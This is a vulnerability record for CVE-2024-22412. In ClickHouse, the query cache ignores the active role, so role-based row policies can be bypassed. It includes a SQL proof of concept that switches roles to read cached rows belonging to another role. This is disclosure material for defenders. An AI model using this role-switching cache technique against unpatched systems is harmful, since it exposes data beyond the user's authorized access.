{
  "modified": "2024-03-20T00:49:23Z",
  "published": "2024-03-18T07:39:41Z",
  "schema_version": "1.5.0",
  "id": "CVE-2024-22412",
  "aliases": [
    "GHSA-45h5-f7g3-gr8r"
  ],
  "details": "### Summary\r\n\r\nThe bug was fixed in this PR but reported to bugcrowd about a month ago. Here's what we submitted to bugcrowd:\r\nhttps://github.com/ClickHouse/ClickHouse/pull/58611\r\n\r\nThis bug exists in the cloud clickhouse offering and likely exists in github.com/clickhouse/clickhouse but we're reporting for the cloud product because that's where the reproducing steps took place.\r\n\r\nQuery caching bypasses the role based access controls and the policies being enforced on roles. Currently, the query cache only respects separate users, however this is not documented and not expected behavior. Based on the documentation, role based access control should be enforced regardless if query caching is enabled or not.\r\n\r\n### Details\r\nIt appears that this issue is caused by the cache key not incorporating the role name, only the user name. It uses the [AST and the userName](https://github.com/ClickHouse/ClickHouse/blob/bd17ee769e337906c4b1f404861e042ad72fcbfc/src/Interpreters/executeQuery.cpp#L1013-L1015)\r\n```\r\nQueryCache::Key key(ast, context-\u003egetUserName());\r\n```\r\nThe context, though, appears to have information about the current role on the context's EnabledRolesInfo\r\n```\r\ncontext-\u003egetRolesInfo()-\u003egetCurrentRolesNames()\r\n```\r\nWe aren't experts on this code base by any means, but it looks like incorporating the role names from getEnabledRolesNames or getCurrentRolesNames (whichever is most appropriate) might be a solution to this issue. But you probably need to include all of the role names.\r\n\r\nIt looks like this is a bug given this is [explicitly documented](https://clickhouse.com/docs/en/operations/query-cache) for users as a security risk but is handled differently for roles:\r\n\r\n\u003eFinally, entries in the query cache are not shared between users due to security reasons. For example, user A must not be able to bypass a row policy on a table by running the same query as another user B for whom no such policy exists. However, if necessary, cache entries can be marked accessible by other users (i.e. shared) by supplying setting query_cache_share_between_users.\r\n\r\n\r\n### PoC\r\n```\r\nCREATE USER admin IDENTIFIED BY  'R~zo3PsI0RPhx';\r\n\r\nGRANT CURRENT GRANTS ON *.* TO admin WITH GRANT OPTION;\r\n\r\n-- Login as admin.  Could be done anytime after admin creation, but must be\r\n-- done before table can be queried, after grants are given\r\n\r\n-- 1. Create the table\r\nCREATE TABLE user_data\r\n(\r\n    ID UInt32,\r\n    userID UInt32\r\n)\r\nENGINE = MergeTree\r\nORDER BY userID;\r\n\r\n-- 2. Create roles with row-level security\r\n\r\n-- Role for users with userID = 1\r\n\r\nCREATE ROLE user_role_1;\r\nGRANT SELECT ON user_data TO user_role_1;\r\nCREATE ROW POLICY user_policy_1 ON user_data\r\n    FOR SELECT USING userID = 1 TO user_role_1;\r\n\r\n-- Role for users with userID = 2\r\n\r\nCREATE ROLE user_role_2;\r\nGRANT SELECT ON user_data TO user_role_2;\r\nCREATE ROW POLICY user_policy_2 ON user_data\r\n    FOR SELECT USING userID = 2 TO user_role_2;\r\n\r\n-- 3. Grant roles to the admin user\r\n\r\nGRANT user_role_1, user_role_2 TO admin;\r\n\r\nINSERT INTO user_data (ID, userID) VALUES (1, 1), (2, 2), (3, 1), (4, 3), (5, 2), (6, 1), (7, 4), (8, 2);\r\n\r\n\r\n-- Switch to admin if not already done so\r\n\r\n-- Policy test\r\n\r\nSET ROLE user_role_1;\r\n\r\n-- only returns rows for user_role_1\r\nSELECT * FROM user_data;\r\n\r\nSET ROLE ALL;\r\nSET ROLE user_role_2;\r\n\r\n-- only returns rows for user_role_2\r\nSELECT * FROM user_data;\r\n\r\nSET ROLE ALL;\r\nSET ROLE user_role_1;\r\n\r\n-- only returns rows for user_role_1\r\nSELECT * FROM user_data SETTINGS use_query_cache=1;\r\n\r\nSET ROLE ALL;\r\nSET ROLE user_role_2;\r\n\r\n-- ðŸš¨ðŸš¨ðŸš¨ðŸš¨ RETURNS ONLY user_role_1 ROWS ðŸš¨ðŸš¨ðŸš¨ðŸš¨\r\nSELECT * FROM user_data SETTINGS use_query_cache=1;\r\n```\r\n\r\n### Impact\r\n\r\nSwitching between different ClickHouse roles with a single user account to query data can lead to ACLs being circumvented when employing query caching. If attackers gain control of the user, they could potentially guess queries and gain access to data beyond their authorized scope.\r\n\r\nThe bug was fixed in this PR but reported to bugcrowd about a month ago. \r\nhttps://github.com/ClickHouse/ClickHouse/pull/58611\r\n\r\n### Recommendation \u0026 Workaround\r\n\r\nClickHouse advises users with vulnerable versions of ClickHouse not to use the query cache when their application dynamically switches between various roles. In order to use query cache, one workaround is to employ multiple users with distinct roles assigned to them, enabling access to various data with differing permissions.",
  "affected": [
    {
      "package": {
        "ecosystem": "DHI",
        "name": "clickhouse-server",
        "purl": "pkg:dhi/clickhouse-server"
      },
      "database_specific": {
        "range_status": "error parsing vulnerable versions: error sanitizing version: invalid version: 24.0.2.54535",
        "source_ecosystem": "clickhouse cloud",
        "source_package": "ClickHouse Cloud"
      }
    },
    {
      "package": {
        "ecosystem": "DHI",
        "name": "clickhouse-server",
        "purl": "pkg:dhi/clickhouse-server"
      },
      "database_specific": {
        "range_status": "error parsing vulnerable versions: error sanitizing version: invalid version: 24.1.1.2048",
        "source_ecosystem": "clickhouse v24",
        "source_package": "ClickHouse"
      }
    },
    {
      "package": {
        "ecosystem": "DHI",
        "name": "clickhouse-server",
        "purl": "pkg:dhi/clickhouse-server"
      },
      "database_specific": {
        "range_status": "error parsing vulnerable versions: error sanitizing version: invalid version: 23.12.6.19",
        "source_ecosystem": "clickhouse v23.12",
        "source_package": "ClickHouse"
      }
    },
    {
      "package": {
        "ecosystem": "DHI",
        "name": "clickhouse-server",
        "purl": "pkg:dhi/clickhouse-server"
      },
      "database_specific": {
        "range_status": "error parsing vulnerable versions: error sanitizing version: invalid version: 23.8.12.13",
        "source_ecosystem": "clickhouse v23.8",
        "source_package": "ClickHouse"
      }
    },
    {
      "package": {
        "ecosystem": "DHI",
        "name": "clickhouse-server",
        "purl": "pkg:dhi/clickhouse-server"
      },
      "database_specific": {
        "range_status": "error parsing vulnerable versions: error sanitizing version: invalid version: 23.3.22.3",
        "source_ecosystem": "clickhouse v23.3",
        "source_package": "ClickHouse"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/ClickHouse/ClickHouse/security/advisories/GHSA-45h5-f7g3-gr8r"
    }
  ]
}